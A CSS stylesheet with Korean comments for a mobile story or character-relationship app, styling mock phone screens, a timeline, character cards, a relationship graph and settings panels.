    .tl-qt{margin:0;font-size:15px;font-weight:700;line-height:1.6;color:var(--ink);word-break:keep-all}
    .tl-qs{margin:2px 0 0;font-size:12.5px;line-height:1.5;color:var(--graphite)}
    .tl-fold .qmake{margin-top:10px}
    .tl-quotes{margin-top:16px}
    .qplus{margin-left:auto;margin-right:8px;width:26px;height:26px;border-radius:50%;border:1px solid var(--rule);background:var(--paper);color:var(--ink2);display:inline-flex;align-items:center;justify-content:center;padding:0}.qplus svg{width:12px;height:12px;stroke:currentColor;stroke-width:2;stroke-linecap:round}.tl-fold summary b::after{content:" ▾";font-size:11px;color:var(--graphite)}.tl-fold[open] summary b::after{content:" ▴"}
    /* 폰: 이모티콘만 보낸 말 · 은행 · 비밀 메모 */
    .im-b.emo,.dm-b.emo{background:transparent!important;font-size:38px;line-height:1.15;padding:0 2px}
    .ic-bank{background:linear-gradient(#3182F6,#1B64DA)}
    .bk-m{font-size:12px!important;margin:4px 0 0!important;opacity:.8}
    .bk-top{margin:10px 14px;padding:16px;border-radius:18px;background:#f2f4f6}
    .bk-top small{font-size:12px;color:#8b95a1}.bk-top p{margin:2px 0 6px;font-size:14px;color:#4e5968}.bk-top b{display:block;font-size:24px;letter-spacing:-.5px;color:#191f28}
    .bk-btns{display:flex;gap:8px;margin-top:12px}.bk-btns span{flex:1;text-align:center;background:rgba(255,255,255,.85);border-radius:10px;padding:8px 0;font-size:13px;font-weight:600;color:#191f28}
    .bk-card{margin:0 14px 6px;padding:12px 16px;border-radius:14px;background:#f9fafb}.bk-card small{font-size:12px;color:#8b95a1}.bk-card p{margin:2px 0 0;font-size:14px}
    .bk-h{margin:14px 16px 4px;font-size:15px;font-weight:700}
    .bk-tx{display:flex;align-items:center;gap:10px;padding:10px 16px}.bk-tx span{flex:1;min-width:0;display:flex;flex-direction:column}
    .bk-tx b{font-size:14.5px;font-weight:600}.bk-tx small{font-size:12px;color:#8b95a1}.bk-tx em{font-style:normal;font-size:14.5px;font-weight:600;color:#191f28}.bk-tx em.in{color:#3182F6}.bk-tx em.miss{color:#FF3B30}
    .bk-tx span{flex:1 1 0;min-width:55%}.bk-tx em{flex:0 1 auto;max-width:42%;text-align:right;overflow-wrap:anywhere;line-height:1.35}
    .sy-row{padding:11px 16px;border-bottom:.5px solid #efeff4}
    .sy-row b{display:block;font-size:14.5px;font-weight:600;color:#1c1c1e;line-height:1.4;overflow-wrap:anywhere;word-break:keep-all}
    .sy-row small{display:block;margin-top:2px;font-size:12.5px;line-height:1.45;color:#8b95a1;overflow-wrap:anywhere;word-break:keep-all}
    .sy-row em{display:block;margin-top:3px;font-style:normal;font-size:12px;font-weight:600;color:var(--xc,#8e8e93)}
    .sy-row em.miss{color:#FF3B30}
    .ph-screen .ph-grid{grid-template-columns:repeat(4,minmax(0,1fr));gap:16px 6px;justify-items:center}
    .ph-screen .ph-grid .ph-app{width:100%;min-width:0}
    .ph-screen .ph-grid .ph-app i{width:100%;max-width:52px;height:auto;aspect-ratio:1/1}
    .ph-screen .ph-grid .ph-app span{max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:10.5px}
    .ph-screen .ph-dock .ph-app i{width:50px;height:50px}
    .ph-lockme{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;padding:0 30px;text-align:center}
    .ph-lockme span{font-size:46px}.ph-lockme b{font-size:16px}
    .ph-lockme button{border:0;border-radius:12px;background:#E0A800;color:#fff;font-weight:700;font-size:15px;padding:10px 22px}.ph-lockme button.sub{background:transparent;color:#8e8e93;font-weight:500}

    /* 폰 v4: 그린 아이콘 · 이모지 가운데 정렬 · 진짜 같은 홈 화면 */
    .ph-screen{--emoji:'Apple Color Emoji','Segoe UI Emoji','Noto Color Emoji',sans-serif}
    .ph-sb{display:flex;align-items:center;gap:5px;color:#000}.ph-sb svg{fill:currentColor;display:block}
    .ph-status b{font-size:15px;font-weight:600;letter-spacing:-.2px}
    .ph-app i{line-height:1;overflow:hidden;font-size:0}
    .ph-app i.ic-x{font-size:28px;font-family:var(--emoji)}
    .xa-h{margin:6px 16px 8px;font-size:22px;font-weight:800;color:var(--xc)}
    .ph-app i svg{width:62%;height:62%;display:block}
    .ic-photos{background:#fff}.ic-photos svg{width:78%!important;height:78%!important}
    .ic-memo{background:#fff}.ic-memo svg{width:100%!important;height:100%!important}
    .ph-app span{font-size:11px;font-weight:500;color:#1c1c1e}
    .ph-home{background:linear-gradient(170deg,var(--wf) -40%,var(--wb) 35%,#fdfbff 70%,var(--wb) 120%)}
    .ph-home{overflow:hidden}.ph-home::before{content:"";position:absolute;width:220px;height:220px;border-radius:50%;top:-40px;right:-30px;background:radial-gradient(circle,var(--wb) 0%,transparent 68%);opacity:.9;pointer-events:none}
    .ph-home>*:not(.ph-dock){position:relative}
    .ph-widget{background:rgba(255,255,255,.55);-webkit-backdrop-filter:blur(18px);backdrop-filter:blur(18px);box-shadow:0 1px 0 rgba(255,255,255,.6) inset}
    .ph-dock{background:rgba(255,255,255,.4);-webkit-backdrop-filter:blur(20px);backdrop-filter:blur(20px)}
    /* 이모지: 줄 높이를 글자 크기에 딱 맞춰 위로 뜨지 않게 */
    .av-e,.ph-fake,.ig-grid button,.al-grid button,.mk-th,.ig-hl i,.ph-widget span,.im-b.emo,.dm-b.emo{font-family:var(--emoji);line-height:1}
    /* 사진 설명 글자는 이모지 글꼴을 물려받으면 띄어쓰기가 넓게 벌어져서, 일반 글꼴로 되돌립니다. */
    .ph-screen .ph-fake small{font-family:-apple-system,'SF Pro Text','Apple SD Gothic Neo',system-ui,sans-serif;line-height:1.5;word-break:keep-all;max-width:90%}
    .av .av-e{display:block;height:1em;line-height:1em;text-align:center}
    emo-in{display:inline-block;font-size:inherit;line-height:1}emo-mk{display:inline-block;width:0;height:0;vertical-align:baseline}
    .ph-screen span.av{flex:none;flex-direction:row;min-width:0}.ph-screen span.av>span{flex:none}
    .im-b.emo,.dm-b.emo{display:flex;align-items:center;padding:2px 0}
    .ig-grid button,.al-grid button{display:flex;align-items:center;justify-content:center}

    /* ── 타임라인 ── */
    .tl-who{display:flex;gap:12px;overflow-x:auto;scrollbar-width:none;user-select:none;-webkit-overflow-scrolling:touch;overscroll-behavior-x:contain;touch-action:pan-x pan-y;margin:0 -22px 12px;padding:4px 22px 6px}.tl-who::-webkit-scrollbar,.cast-row::-webkit-scrollbar{display:none}
    .tl-who button{flex:0 0 auto;width:56px;border:0;background:transparent;display:flex;flex-direction:column;align-items:center;gap:5px;padding:0}
    .tl-who .av{width:44px;height:44px;font-size:18px}.tl-who small{font-size:11.5px;font-weight:600;color:var(--graphite);max-width:56px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .tl-who button[aria-pressed="true"] .av{box-shadow:0 0 0 2px var(--paper),0 0 0 4px var(--ink)}.tl-who button[aria-pressed="true"] small{color:var(--ink);font-weight:800}
    .tl-all{background:var(--mist);color:var(--ink2)}
    .tl-up,.tl-mem,.tl-story{border:1px solid var(--rule);border-radius:16px;padding:10px 14px;margin:0 0 10px}
    .tl-story .story{margin-top:8px}
    .tl-up b,.tl-mem b{display:block;font-size:13px;margin-bottom:4px}
    .tl-up-h{display:flex;align-items:center;justify-content:space-between}.tl-up-h .linkbtn{padding:0}
    .tl-done{margin:6px 0 0}.tl-done summary{font-size:12.5px;color:var(--graphite)}.tl-up p,.tl-mem p{margin:2px 0;font-size:13.5px;line-height:1.6;color:var(--ink2)}.tl-up span{font-weight:700;color:var(--ink)}
    .tline{list-style:none;margin:6px 0 0;padding:0 0 0 22px;border-left:2px dotted var(--pencil);margin-left:8px}
    .tline li{position:relative;padding:0 0 18px}
    .tline li::before{content:"";position:absolute;box-sizing:border-box;left:-30px;top:3px;width:14px;height:14px;border-radius:50%;background:var(--paper);border:3px solid var(--ink)}
    .tline li.old::before{border-color:var(--pencil)}
    .tline li.side{opacity:.7;padding-bottom:12px}.tl-side{margin-left:10px;color:var(--ink2);font-size:13px}.tl-side b{font-weight:700;color:var(--ink)}.tline li.side .tl-title{font-weight:600}
    .tl-date{display:inline-block;font-size:11.5px;font-weight:700;color:var(--ink2);background:var(--mist);border-radius:999px;padding:1px 9px}
    .tl-title{display:block;margin:5px 0 3px;font-size:15.5px;font-weight:700;color:var(--ink);word-break:keep-all}
    .tline p{margin:1px 0;font-size:14px;line-height:1.65;color:var(--ink2)}
    .tl-up .thr{padding:8px 0}.tl-up .thr+.thr{border-top:1px dashed var(--rule)}
    .tl-up .thr b{display:flex;align-items:center;gap:6px;margin:0 0 2px;font-size:14px;line-height:1.45}
    .thk{font-style:normal;flex:none;font-size:11.5px;font-weight:700;border-radius:6px;padding:1px 7px;background:#FBEAEE;color:#A23C50}
    .tl-up .pnt,.tline .pnt{margin:2px 0 0;font-size:13.5px;line-height:1.55;color:var(--ink2)}
    .tl-meta,.tline .tl-meta{margin:0 0 2px;font-size:12.5px;line-height:1.5;color:var(--graphite)}
    .tl-ppl{display:flex;margin-top:6px}.tl-ppl .av{width:24px;height:24px;font-size:12px;margin-right:-6px;box-shadow:0 0 0 2px var(--paper)}

    /* ── 현재상태 ── */
    .secdesc{margin:0 0 12px;font-size:12.5px;line-height:1.6;color:var(--ink2);background:var(--mist);border-radius:12px;padding:8px 12px;word-break:keep-all}
    .scene{background:var(--mist);border-radius:14px;padding:10px 14px 11px;margin:4px 0 6px}
    .scene-k{display:block;margin-bottom:3px;font-size:12px;font-weight:700;color:var(--graphite)}
    .scene-main{margin:6px 0 0;font-family:var(--serif);font-size:18px;font-weight:700;line-height:1.5;color:var(--ink);word-break:keep-all}
    .scene-sub{margin:4px 0 0;font-size:13.5px;line-height:1.6;color:var(--ink2)}
    .scl{display:grid;grid-template-columns:34px minmax(0,1fr);gap:6px;align-items:baseline;margin-top:3px}
    .scl span{font-size:11.5px;font-weight:700;color:var(--graphite)}
    .scl b{font-size:14px;font-weight:600;line-height:1.5;color:var(--ink);word-break:keep-all}
    .scm{margin:4px 0 0;font-size:12.5px;line-height:1.5;color:var(--graphite)}
    .rk{font-style:normal;font-size:11.5px;font-weight:700;border-radius:999px;padding:1px 8px;margin-right:7px;background:var(--mist);color:var(--ink2)}
    .nchip{font-weight:700;color:var(--ink);white-space:nowrap}i.nar{font-style:normal;margin:0 3px;color:var(--pencil)}
    .wg{display:grid;grid-template-columns:44px minmax(0,1fr);gap:6px;align-items:start;margin-top:6px}.wg:first-child{margin-top:0}
    .wk{font-size:11.5px;font-weight:700;color:var(--graphite);padding-top:5px}
    .nv .pnt{margin:0 0 2px}
    .ncard{background:var(--paper);border:1.5px solid var(--nb);border-radius:18px;padding:12px 14px;margin:0 0 10px}
    .ncard-h{display:flex;align-items:center;gap:10px;border:0;background:transparent;padding:0;width:100%;text-align:left}
    .ncard-h .av{width:38px;height:38px;font-size:16px}
    .ncard-t{flex:1;min-width:0}
    .ncard-t b{font-size:15.5px;font-weight:700;background:linear-gradient(transparent 58%,var(--nb) 58%);padding:0 2px}
    .ncard-t small{font-size:12px;color:var(--nf);font-weight:600;margin-left:6px}
    .ncard-h::after{content:"›";color:var(--pencil);font-size:18px}
    .fold>summary::after{content:"›";color:var(--pencil);font-size:18px;transition:transform .15s;flex-shrink:0}
    .fold[open]>summary::after{transform:rotate(90deg)}
    .igrp{margin:0 0 14px}.igh{display:flex;align-items:center;gap:8px;padding:6px 0;border-bottom:1px solid var(--rule)}.igh .av{width:26px;height:26px;font-size:13px}.igh b{font-size:14px;font-weight:700}.igh small{font-size:12px;color:var(--pencil)}
    .igrp .fold{padding-left:34px}
    .fold{margin:0;border-bottom:1px solid var(--rule)}
    .fold>summary{display:flex;align-items:center;gap:10px;padding:13px 0;list-style:none;cursor:pointer;font-size:inherit;color:var(--ink)}
    .fold>summary::-webkit-details-marker{display:none}
    .fold-t{flex:1;min-width:0}.fold-t b{font-size:15px;font-weight:600}
    .fold-t small{display:block;font-size:12.5px;color:var(--graphite);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
    .fold[open] .fold-t small{display:none}.fkeep .fold[open] .fold-t small{display:block}
    .fold-b{padding:0 0 14px}
    .fold-ul{margin:0;padding:0;list-style:none}
    .fold-ul li{padding:2px 0;font-size:14.5px;line-height:1.7;color:var(--ink2);overflow-wrap:anywhere}.fold-ul li b{color:var(--ink)}
    @media (prefers-reduced-motion:reduce){.fold>summary::after{transition:none}}
    .nrow{display:grid;grid-template-columns:52px minmax(0,1fr);gap:8px;align-items:baseline;margin-top:10px}
    .nk{font-size:12.5px;font-weight:700;color:var(--nf);white-space:nowrap}
    .nv{font-size:14px;line-height:1.6;color:var(--ink2);min-width:0}.nv .wear{margin-top:0}
    .nv .wear span{background:var(--nb);color:var(--ink)}
    .nrules{list-style:none;margin:0;padding:0;display:flex;flex-direction:column}
    /* 상태 탭 약속·습관·둘만의 것: 타임라인 카드와 같은 테두리 */
    .st-card{border:1px solid var(--rule);border-radius:16px;padding:10px 14px 4px;margin:0 0 10px}.st-card .st-h{font-size:13px;font-weight:700;color:var(--ink);margin-bottom:2px}
    .nrules li{font-size:14px;line-height:1.55;color:var(--ink);padding:9px 0;border-bottom:1px solid var(--rule)}.nrules li:last-child{border-bottom:0}

    /* ── 인물 탭 ── */
    .list{display:flex;flex-direction:column}
    .row{padding:14px 0;border-bottom:1px solid var(--rule)}
    .row:last-child{border-bottom:0}
    .row .t{display:flex;align-items:center;gap:8px;margin-bottom:4px}.row .t b{flex:1;min-width:0;font-size:15px}
    .row p{margin:0;font-size:14px;line-height:1.65;color:var(--ink2);word-break:break-word}
    .tag{display:none!important}
    .kchips{display:flex;flex-wrap:wrap;gap:6px;margin-top:9px}
    .kchip{display:inline-flex;align-items:center;gap:4px;font-size:12.5px;font-weight:600;border-radius:8px;padding:4px 10px;border:0!important;max-width:100%}
    .kchip span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    .hidebox{display:block;margin-top:9px;font-size:13px;line-height:1.55;color:var(--ink2);background:var(--butter);border-radius:8px;padding:7px 11px}
    .sp{display:flex;align-items:center;gap:8px;flex-wrap:wrap}.sp .who{font-size:15px;font-weight:700}
    .sp svg{display:none}.sp .who+.who::before{content:"→ ";color:var(--pencil);font-family:var(--sans)}
    .sp .addr{font-size:14px;font-weight:700;background:linear-gradient(transparent 55%,var(--sky) 55%);padding:0 2px}
    .sp .reg{font-size:12.5px;color:var(--graphite)}
    .sp .who+.who::before{content:"→ ";color:var(--pencil);font-family:var(--sans)}
    .spchips{display:flex;flex-wrap:wrap;gap:6px 14px;margin-top:6px}
    .spc{display:inline-flex;align-items:baseline;gap:6px}
    .spc{flex-wrap:nowrap}.spc .addr,.sp .addr{white-space:nowrap}
    .reg-tag{display:inline-block;font-size:11.5px;font-weight:600;color:var(--graphite);background:var(--mist);border-radius:6px;padding:1px 7px;margin-left:6px;vertical-align:2px;white-space:nowrap}
    .addrs{display:flex;flex-wrap:wrap;gap:4px 10px;margin-top:8px}
    details.spgrp{margin:0;border-bottom:1px solid var(--rule)}
    details.spgrp>summary{display:flex;align-items:center;gap:10px;padding:12px 0;list-style:none;cursor:pointer;font-size:inherit;color:var(--ink)}
    details.spgrp>summary::-webkit-details-marker{display:none}
    details.spgrp>summary .av{width:34px;height:34px;font-size:14px}
    details.spgrp>summary b{flex:1;font-size:15px;font-weight:600}
    details.spgrp>summary span{font-size:12.5px;color:var(--graphite)}
    details.spgrp>summary::after{content:"›";color:var(--pencil);font-size:18px;transition:transform .15s}
    details.spgrp[open]>summary::after{transform:rotate(90deg)}
    .sprow{display:flex;flex-wrap:wrap;align-items:baseline;gap:4px 8px;padding:0 0 10px 44px}
    .sprow .addrs{margin:0}.spto{font-size:13.5px;color:var(--graphite);white-space:nowrap}
    .addrs .addr{white-space:nowrap;font-size:14px;font-weight:500;color:var(--ink2);background:linear-gradient(transparent 60%,var(--sky) 60%);padding:0 2px}
    .spc .addr{font-size:14px;font-weight:700;background:linear-gradient(transparent 55%,var(--sky) 55%);padding:0 2px}
    .spc .reg{font-size:12.5px;color:var(--graphite);white-space:nowrap}
    .search{display:flex;align-items:center;gap:8px;height:44px;padding:0 14px;border-radius:22px;background:var(--mist);margin-bottom:12px}
    .search svg{display:none}.search input{flex:1;border:0;background:transparent;outline:none;font-size:15px;color:var(--ink)}
    .centers{display:flex;gap:14px;overflow-x:auto;scrollbar-width:none;margin:0 -22px 14px;padding:0 22px}.centers::-webkit-scrollbar{display:none}
    .centers button{flex:0 0 auto;border:0;border-radius:999px;background:var(--mist);padding:4px 12px;font-size:13.5px;font-weight:600;color:var(--ink2)}
    .centers button[aria-pressed="true"]{background:var(--ink);color:var(--paper);font-weight:700}
    .av{position:relative;width:40px;height:40px;border-radius:20px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:16px;flex-shrink:0}
    .av .av-e{font-size:1.25em;line-height:1}
    .av .av-t.two{font-size:.72em;letter-spacing:-.5px}
    .av[data-g]::after{position:absolute;right:-3px;bottom:-3px;width:16px;height:16px;border-radius:50%;border:2px solid var(--paper);font-size:10px;font-weight:800;line-height:12px;text-align:center;color:#fff}
    .av[data-g="f"]::after{content:"♀";background:#E58FB0}
    .av[data-g="m"]::after{content:"♂";background:#7FA8DE}
    .bigmap{border:0;background:transparent;padding:4px 0;margin:0 0 12px;font-size:13.5px;font-weight:700;color:var(--ink);text-decoration:underline;text-underline-offset:3px}
    .rcenter{display:flex;align-items:center;gap:12px;padding:4px 0 10px}
    .rcenter .av{width:52px;height:52px;border-radius:26px;font-size:20px}
    .rcenter b{display:block;font-size:18px}.rcenter small{font-size:12.5px;color:var(--graphite);line-height:1.5}
    .rlist{position:relative;margin-left:25px;padding-left:20px;border-left:2px dotted var(--pencil)}
    .rrow{position:relative;padding:14px 0 0}
    .rhead{border:0;background:transparent;display:flex;align-items:center;gap:10px;padding:0;text-align:left;width:100%}
    .rhead span{display:flex;flex-direction:column;min-width:0}
    .rhead b{font-size:15.5px}.rhead small{font-size:12px;color:var(--graphite);line-height:1.45;overflow-wrap:anywhere}
    .rline{margin:6px 0 0 50px;font-size:14px;line-height:1.6;color:var(--ink2)}
    .rline i{font-style:normal;font-weight:700;color:var(--ink);margin-right:6px;font-size:12.5px}
    .rsub{margin:8px 0 0 50px;display:flex;flex-direction:column;gap:4px}
    .rsub button{border:0;background:transparent;padding:2px 0;text-align:left;font-size:13px;color:var(--ink2);line-height:1.5}
    .tree{overflow:hidden;padding:8px 0 4px}
    .tnode{border:0;background:transparent;display:flex;flex-direction:column;align-items:center;gap:5px;padding:0;margin:0 auto;max-width:100%;min-width:0}
    .tnode b{font-size:14px}
    .tnode small{font-size:11.5px;color:var(--graphite);max-width:100%;text-align:center;line-height:1.4;overflow-wrap:anywhere;word-break:keep-all;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
    .tnode.root .av{width:60px;height:60px;border-radius:30px;font-size:22px;box-shadow:0 0 0 3px var(--paper),0 0 0 4.5px var(--ink)}
    .trunk{width:0;height:16px;border-left:2px dotted var(--pencil);margin:8px auto 0}
    .branches{position:relative;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:16px 10px}
    .branches.one{grid-template-columns:minmax(0,1fr)}
    .branches:not(.one)::before{content:"";position:absolute;top:0;left:25%;right:25%;border-top:2px dotted var(--pencil)}
    .branch{display:flex;flex-direction:column;align-items:center;min-width:0}
    .stub{width:0;height:12px;border-left:2px dotted var(--pencil)}
    .edge{width:100%;padding:4px 2px 8px;font-size:12px;line-height:1.5;color:var(--ink2);text-align:center}
    .edge div{display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
    .edge i{font-style:normal;font-weight:800;color:var(--graphite);margin-right:3px}
    .subs{width:100%;margin-top:8px;display:flex;flex-direction:column;gap:3px}
    .subs button{border:0;background:transparent;padding:2px 0;text-align:center;font-size:11.5px;color:var(--ink2);line-height:1.45;overflow-wrap:anywhere}
    .pcard{width:100%;border:0;border-bottom:1px solid var(--rule);background:transparent;text-align:left;padding:12px 0;display:flex;align-items:center;gap:12px}
    .pcard svg{display:none}.pcard::after{content:"›";color:var(--pencil);font-size:18px}
    .pcard span.t{flex:1;display:flex;flex-direction:column;gap:2px;min-width:0}
    .pcard b{font-size:15.5px}.pcard small{font-size:12.5px;color:var(--graphite);line-height:1.5;overflow-wrap:anywhere}
    .phead{display:flex;align-items:center;gap:14px;margin:0 0 6px}
    .phead .av{width:62px;height:62px;border-radius:31px;font-size:24px}

    /* ── 전체 관계도 ── */
    .gwrap{position:relative;height:100%;margin:0;background:radial-gradient(#E7E3F3 1.2px,transparent 1.2px) 0 0/20px 20px,#FBFAFE;overflow:hidden;touch-action:none;user-select:none;-webkit-user-select:none}
    .gwrap svg{display:block}
    .ge path{fill:none;stroke:#D8CFF6;stroke-width:3;stroke-linecap:round}
    .ge.on path{stroke:#9D8CEB}
    .ge text{font-size:11.5px;font-weight:600;fill:var(--ink2);paint-order:stroke;stroke:#FBFAFE;stroke-width:5px;stroke-linejoin:round}
    .ge .who{font-weight:800;fill:var(--ink)}
    .gn{cursor:pointer}
    .gn .halo{fill:var(--paper);stroke-width:0;filter:drop-shadow(0 2px 4px rgba(75,63,138,.14))}.gn.sel .halo{stroke-width:3}
    .gn .nm{font-size:12.5px;font-weight:800}
    .dim{opacity:.16}
    .gctl{position:absolute;right:12px;top:12px;display:flex;flex-direction:column;gap:6px}
    .gctl button{width:40px;height:40px;border:1.5px solid var(--ink);border-radius:20px;background:var(--paper);color:var(--ink);font-size:18px;font-weight:600;display:flex;align-items:center;justify-content:center}
    .gctl svg{width:16px;height:16px}
    .ghint{position:absolute;left:14px;right:64px;top:16px;font-size:12px;color:var(--graphite);line-height:1.5}
    .ginfo{position:absolute;left:10px;right:10px;bottom:10px;background:var(--paper);border:1.5px solid var(--ink);border-radius:18px;padding:14px;max-height:45%;overflow:auto}
    .ginfo-body{margin-top:4px}

    /* ── 미리보기 · 편집 · 도구 ── */
    .card{padding:4px 0 18px;margin-bottom:14px;border-bottom:1px solid var(--rule)}
    .card+.card{margin-top:0}
    .card .note,.note{font-size:12.5px;color:var(--graphite);line-height:1.6}
    .tbl-h{display:flex;align-items:baseline;justify-content:space-between;gap:8px}
    .tbl-h b{font-size:15px}.tbl-h span{font-size:12px;color:var(--graphite)}
    .sizecmp{display:flex;align-items:center;justify-content:space-between;gap:8px;margin-top:10px;font-size:13px;color:var(--graphite)}.sizecmp b{color:var(--ink)}
    .pvrow{width:100%;border:0;border-bottom:1px solid var(--rule);background:transparent;padding:13px 0;display:flex;align-items:center;gap:12px;text-align:left}
    .pvrow svg{display:none}.pvrow::after{content:"›";color:var(--pencil);font-size:18px}
    .pvrow b{flex:1;font-size:15px}.pvrow small{font-size:12px;color:var(--graphite)}
    .sw{width:6px;height:22px;border-radius:3px;flex-shrink:0}
    .chg{display:flex;gap:4px}.chg span{font-size:11.5px;font-weight:700;border-radius:6px;padding:2px 6px}
    .add{background:var(--sage);color:var(--ok)}.del{background:var(--blush);color:var(--bad)}.same{color:var(--graphite)}
    textarea{width:100%;min-height:360px;border:1.5px solid var(--rule);border-radius:16px;background:var(--paper);padding:14px 16px;font-size:14.5px;line-height:1.75;color:var(--ink);resize:vertical;outline:none}
    textarea:focus{border-color:var(--ink)}
    .injbox{padding:4px 0 16px;margin-bottom:14px;border-bottom:1px solid var(--rule)}
    .injbox .k{font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:8px}
    .tail{font-size:14px;line-height:1.7;color:var(--ink2);border-left:2px solid var(--rule);padding-left:12px}
    .noteview{white-space:pre-wrap;word-break:break-word;font-size:14px;line-height:1.75;color:var(--ink);margin:0;padding:0;background:transparent;max-height:none;font-family:var(--sans)}
    details{margin-top:10px}summary{font-size:12.5px;color:var(--graphite);cursor:pointer}
    pre{white-space:pre-wrap;word-break:break-word;font-size:12px;line-height:1.6;background:var(--mist);border-radius:12px;padding:12px;max-height:260px;overflow:auto;margin:8px 0 0;font-family:var(--sans)}
    .jump{display:flex;flex-direction:column}
    .jump button{width:100%;border:0;border-bottom:1px solid var(--rule);background:transparent;display:flex;align-items:center;gap:12px;padding:14px 0;text-align:left}
    .jump button>svg{display:none}
    .jump .jumprow{width:100%;display:flex;align-items:center;gap:12px;padding:14px 0;border-bottom:1px solid var(--rule);cursor:pointer}
    .jump .jumprow::after{content:"›";color:var(--pencil);font-size:18px}.jump button::after{content:"›";color:var(--pencil);font-size:18px}
    .jump b{flex:1;font-size:15px;font-weight:600;color:var(--ink)}.jump span.v{font-size:12.5px;color:var(--graphite)}
    .bars{display:flex;align-items:flex-end;gap:8px;height:120px;margin-top:12px}
    .bar-col{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;height:100%;min-width:0}
    .bar-wrap{flex:1;width:100%;display:flex;align-items:flex-end;justify-content:center}
    .bar-wrap i{display:block;width:60%;border-radius:4px 4px 0 0;background:var(--lilac)}.bar-col:last-child .bar-wrap i{background:var(--ink)}
    .bv{font-size:10px;color:var(--graphite);white-space:nowrap}.bl{font-size:11px;font-weight:700;color:var(--ink2)}.bd{font-size:10px;color:var(--graphite)}
    .numpick{display:flex;flex-wrap:wrap;gap:6px}
    .numpick button{min-width:44px;height:36px;padding:0 12px;border:1.5px solid var(--rule);border-radius:18px;background:var(--paper);font-size:14px;font-weight:700;color:var(--ink)}
    .numpick button[aria-pressed="true"]{background:var(--ink);border-color:var(--ink);color:#fff}
    .ruleline{margin-top:10px;font-size:12.5px;color:var(--ok);font-weight:600}.ruleline svg{display:none}
    .fixlist{display:flex;flex-direction:column;margin-top:8px}
    .fx{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid var(--rule);font-variant-numeric:tabular-nums}
    .fx svg{display:none}
    .fx .from{font-size:14px;color:var(--bad);text-decoration:line-through;min-width:28px;text-align:right}
    .fx .to{font-size:14px;font-weight:800;color:var(--ink);min-width:28px}
    .fx .ctx{flex:1;min-width:0;font-size:12px;color:var(--graphite);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .fixrow{display:flex;align-items:center;gap:8px;margin-top:10px}
    .fixrow input{width:84px;height:38px;border:1.5px solid var(--rule);border-radius:12px;padding:0 10px;font-size:15px;font-weight:700;background:var(--paper);outline:none}
    .fixrow span{font-size:13px;color:var(--graphite);flex:1}

    .opts{display:flex;flex-direction:column;gap:8px;margin-top:6px}
    .opt{border:1.5px solid var(--rule);background:var(--paper);border-radius:14px;padding:12px 14px;display:flex;align-items:center;gap:12px;text-align:left}
    .opt i{width:18px;height:18px;border-radius:50%;border:2px solid var(--pencil);flex-shrink:0}
    .opt.on{border-color:#9D8CEB;background:#F6F3FE}.opt.on i{border:5px solid #9D8CEB}
    .opt span{display:flex;flex-direction:column;gap:2px;min-width:0}
    .opt b{font-size:15px;color:var(--ink)}.opt small{font-size:12.5px;color:var(--graphite);line-height:1.45}
    .opt:disabled{opacity:.4}
    .steps{margin:16px 0 0;padding:0 0 0 20px;font-size:13.5px;line-height:1.7;color:var(--ink2)}
    .steps b{color:var(--ink)}
    label.btn{cursor:pointer}
    .extbtns{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:8px;margin-top:6px}
    .extbtn{border:1.5px solid var(--rule);background:var(--paper);border-radius:14px;padding:12px 8px;display:flex;flex-direction:column;align-items:center;gap:3px;text-align:center}
    .extbtn b{font-size:13.5px;color:var(--ink)}.extbtn span{font-size:11.5px;color:var(--graphite)}
    .extbtn:not(:disabled):active{border-color:var(--ink)}.extbtn:disabled{opacity:.4}
    .extin{min-height:200px;margin-top:6px}
    /* ── 설정 ── */
    .sg{font-family:var(--serif);font-size:16.5px;font-weight:700;margin:30px 0 2px;color:var(--ink)}
    main>.sg:first-child{margin-top:2px}
    .srow{display:flex;align-items:center;gap:14px;padding:11px 0;border-bottom:1px solid var(--rule);cursor:default;min-height:58px}
    .srow>div{flex:1;min-width:0}
    .srow b{display:block;font-size:15px;font-weight:600;color:var(--ink)}
    .srow small{display:block;font-size:12.5px;color:var(--graphite);line-height:1.5;margin-top:3px}
    .srow.col{flex-direction:column;align-items:stretch;gap:8px}
    .srow select,.srow input[type=text],.srow input[type=password]{flex:0 0 auto;width:52%;max-width:240px;height:40px;border:1.5px solid var(--rule);border-radius:12px;padding:0 34px 0 12px;font-size:14px;font-weight:600;color:var(--ink);outline:none;
      -webkit-appearance:none;appearance:none;background:var(--paper) url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8'%3E%3Cpath d='M1 1l5 5 5-5' fill='none' stroke='%231F1D24' stroke-width='1.8'/%3E%3C/svg%3E") no-repeat right 12px center}
    .srow select:focus,.srow input:focus{border-color:var(--ink)}
    .backrow{display:flex;align-items:baseline;gap:6px;width:100%;margin:0 0 12px;padding:4px 0 10px;border:0;border-bottom:1px solid var(--rule);background:transparent;text-align:left;color:var(--ink);font-size:15px;cursor:pointer}.backrow b{font-size:15px;font-weight:700}.backrow span{font-size:12px;color:var(--graphite);margin-left:4px}
    .keys{margin:0 0 6px}.keys>summary{display:flex;justify-content:space-between;gap:10px;padding:12px 0;cursor:pointer;list-style:none;border-bottom:1px solid var(--rule)}.keys>summary::-webkit-details-marker{display:none}
    .keys>summary b{font-size:14px;font-weight:700;color:var(--ink)}.keys>summary span{font-size:12.5px;color:var(--graphite)}
    .keybox{flex:0 0 auto;width:52%;max-width:240px;height:40px;display:flex;align-items:center;border:1.5px solid var(--rule);border-radius:12px;background:var(--paper);padding:0 4px 0 0}.keybox:focus-within{border-color:var(--ink)}
    .srow .keybox input[type=password],.srow .keybox input[type=text]{flex:1;min-width:0;width:auto;max-width:none;height:100%;border:0;padding:0 8px 0 12px;background:transparent}
